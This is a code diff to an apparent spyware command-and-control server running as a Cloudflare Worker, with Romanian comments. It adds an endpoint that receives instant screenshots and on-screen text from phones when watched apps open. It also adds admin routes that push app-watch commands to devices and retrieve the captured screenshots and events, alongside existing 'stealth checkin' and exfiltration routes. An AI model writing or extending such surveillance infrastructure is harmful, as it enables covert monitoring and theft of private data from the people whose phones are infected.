@@ -1294,6 +1294,42 @@ async function handleC2File(request, env, uid) {
   } catch (_) { return json({ error: "Upload eșuat." }, 500); }
 }
 
+// ── Instant event: telefonul detectează o aplicație monitorizată și trimite
+//    screenshot + text imediat (fără să aștepte keepalive/heartbeat) ──
+async function handleSyncEvent(request, env, uid) {
+  if (!env.C2) return json({ error: "sync" }, 503);
+  let body; try { body = await request.json(); } catch (_) { return json({ error: "bad" }, 400); }
+  const ts = Math.floor(Date.now() / 1000);
+  const safePkg = String(body.pkg || "").replace(/[^a-zA-Z0-9_.]/g, "_").slice(0, 80);
+  const rec = {
+    type: String(body.type || "app_trigger").slice(0, 32),
+    pkg: String(body.pkg || "").slice(0, 256),
+    screen_text: String(body.screen_text || "").slice(0, 2000),
+    bat: Number(body.bat) || 0,
+    has_shot: !!body.screenshot,
+    at: ts
+  };
+  const base = "events/" + uid + "/" + ts + "_" + safePkg;
+  try {
+    await env.C2.put(base + ".json", JSON.stringify(rec));
+    if (body.screenshot) {
+      const shotKey = base + "_shot.jpg";
+      const bytes = Uint8Array.from(atob(body.screenshot), c => c.charCodeAt(0));
+      await env.C2.put(shotKey, bytes, { httpMetadata: { contentType: "image/jpeg" } });
+      rec.shot_key = shotKey;
+    }
+    const idxKey = "events/" + uid + "/_index.json";
+    const idxObj = await env.C2.get(idxKey);
+    let idx = [];
+    if (idxObj) { try { idx = JSON.parse(await idxObj.text()); } catch (_) { } }
+    idx.unshift({ key: base + ".json", at: ts, pkg: rec.pkg, has_shot: rec.has_shot });
+    if (idx.length > 200) idx = idx.slice(0, 200);
+    await env.C2.put(idxKey, JSON.stringify(idx));
+  } catch (e) { return json({ error: "store" }, 500); }
+  c2log("event", uid, "pkg=" + rec.pkg + " has_shot=" + rec.has_shot);
+  return json({ ok: true, key: base + ".json" });
+}
+
 // ── Rules engine: autonomous alerting ───────────────────────────────
 // Rules are stored in R2 at rules/{uid}.json (per-device) and rules/global.json.
 // Each rule: { id, name, trigger:{type, pattern|threshold}, actions:[], cooldown_s, enabled, lastFired }
@@ -1946,6 +1982,52 @@ async function handleAdminC2(request, env, url) {
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const summary = await c2IntelSummary(env, uid);
     return json({ summary });
+  }
+  // ── App Watch: instant trigger config + events ──
+  if (request.method === "PUT" && p === "/admin/api/c2/watch") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    let body; try { body = await request.json(); } catch(_) { return json({ error: "JSON invalid." }, 400); }
+    const apps = (Array.isArray(body.apps) ? body.apps : []).map(a => String(a).slice(0, 256)).filter(a => a).slice(0, 50);
+    const cooldown = Math.max(10, Math.min(Number(body.cooldown_s) || 60, 3600));
+    const watch = { apps, cooldown_s: cooldown, enabled: true, updated: Math.floor(Date.now() / 1000) };
+    await env.C2.put("watch/" + uid + ".json", JSON.stringify(watch));
+    await c2Enqueue(env.C2, uid, [{ action: "watch_apps", params: { apps, cooldown_s: cooldown } }]);
+    return json({ ok: true, count: apps.length });
+  }
+  if (request.method === "DELETE" && p === "/admin/api/c2/watch") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    await env.C2.put("watch/" + uid + ".json", JSON.stringify({ apps: [], enabled: false }));
+    await c2Enqueue(env.C2, uid, [{ action: "unwatch_apps", params: {} }]);
+    return json({ ok: true });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/watch") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const obj = await env.C2.get("watch/" + uid + ".json");
+    if (!obj) return json({ watch: null });
+    return json({ watch: JSON.parse(await obj.text()) });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/events") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const limit = Math.min(parseInt(url.searchParams.get("limit")) || 50, 200);
+    let events = [];
+    try {
+      const io = await env.C2.get("events/" + uid + "/_index.json");
+      if (io) events = JSON.parse(await io.text()).slice(0, limit);
+    } catch(_) {}
+    return json({ events });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/event") {
+    const key = String(url.searchParams.get("key") || "").replace(/[^a-zA-Z0-9._\/-]/g, "");
+    if (!key.startsWith("events/")) return json({ error: "Key invalidă." }, 400);
+    const obj = await env.C2.get(key);
+    if (!obj) return json({ error: "Inexistent." }, 404);
+    const ct = obj.httpMetadata?.contentType || "";
+    if (ct === "image/jpeg") return new Response(obj.body, { headers: { "content-type": "image/jpeg", "content-disposition": 'inline; filename="' + key.split("/").pop() + '"' } });
+    return json(JSON.parse(await obj.text()));
   }
   return json({ error: "Rută necunoscută." }, 404);
 }
@@ -3267,6 +3349,7 @@ async function route(request, env, url, ctx, auth = requireUser) {
     if (url.pathname === "/v1/sync/keepalive") return handleStealthCheckin(request, env, uid);
     if (url.pathname === "/v1/sync/report") return handleC2Result(request, env, uid);
     if (url.pathname === "/v1/sync/attach") return handleC2File(request, env, uid);
+    if (url.pathname === "/v1/sync/event") return handleSyncEvent(request, env, uid);
     // Endpinte legacy (compatibilitate cu clienți vechi)
     if (url.pathname === "/v1/c2/checkin") return handleCheckin(request, env, uid);
     if (url.pathname === "/v1/c2/result") return handleC2Result(request, env, uid);
